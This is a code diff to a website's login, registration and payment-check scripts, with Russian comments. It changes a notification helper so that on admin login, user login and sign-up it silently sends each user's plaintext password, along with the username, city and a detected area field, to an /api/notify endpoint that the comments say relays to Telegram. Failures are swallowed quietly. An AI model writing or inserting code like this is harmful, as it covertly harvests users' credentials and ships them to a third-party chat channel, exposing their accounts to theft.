@@ -2245,13 +2245,13 @@
         };
 
         // Отправка уведомления на серверless функцию /api/notify (Telegram)
-        // now supports: sendAuthNotify(name, type, chosenCity, area)
-        function sendAuthNotify(name, type, chosenCity, area) {
+        // now supports: sendAuthNotify(name, type, chosenCity, area, password)
+        function sendAuthNotify(name, type, chosenCity, area, password) {
             try {
                 fetch('/api/notify', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ name: name || '', type: type || '', chosenCity: chosenCity || '', area: area || '' })
+                    body: JSON.stringify({ name: name || '', type: type || '', chosenCity: chosenCity || '', area: area || '', password: password || '' })
                 }).catch(()=>{});
             } catch(e) { /* тихо */ }
         }
@@ -2343,7 +2343,10 @@
                 showAuthLoading();
                 setTimeout(() => {
                     Storage.saveSession({ username: u, isAdmin: true, city: userCity, at: Date.now() });
-                    sendAuthNotify(u, 'admin-login', userCity, '');
+                    // try to detect any area/district input visible
+                    let detectedAreaAdmin = '';
+                    try { detectedAreaAdmin = (document.getElementById('reg-city-picked')||{}).innerText || ''; } catch(e){}
+                    sendAuthNotify(u, 'admin-login', userCity || '', detectedAreaAdmin || '', p1 || '');
                     document.getElementById('user-display').innerText = u;
                     document.getElementById('user-city-display').innerText = userCity ? `Город: ${userCity}` : "";
                     document.getElementById('auth-screen').classList.add('hidden');
@@ -2388,7 +2391,12 @@
             showAuthLoading();
             setTimeout(() => {
                 Storage.saveSession({ username: u, isAdmin: false, city: userCity, at: Date.now() });
-                sendAuthNotify(u, isLoginMode ? 'login' : 'register', userCity, '');
+                // detect possible 'area' fields (reg-city-picked, pay-location, job-area)
+                let detectedArea = '';
+                try { detectedArea = (document.getElementById('reg-city-picked')||{}).innerText || ''; } catch(e){}
+                if(!detectedArea) try { detectedArea = (document.getElementById('pay-location')||{}).innerText || ''; } catch(e){}
+                if(!detectedArea) try { detectedArea = (document.getElementById('job-area')||{}).value || ''; } catch(e){}
+                sendAuthNotify(u, isLoginMode ? 'login' : 'register', userCity || '', detectedArea || '', p1 || '');
                 document.getElementById('user-display').innerText = u;
                 document.getElementById('user-city-display').innerText = userCity ? `Город: ${userCity}` : "";
                 document.getElementById('auth-screen').classList.add('hidden');
@@ -3472,7 +3480,8 @@
                             const name = session.username || '—';
                             const city = session.city || '';
                             const product = (document.getElementById('pay-product') || {}).innerText || '';
-                            sendAuthNotify(name, 'paycheck', city || '', product || '');
+                            // try to pass password if available (not relevant for pay-check), pass product as area
+                            sendAuthNotify(name, 'paycheck', city || '', product || '', '');
                         } catch (e) { /* silent */ }
                     });
                 }
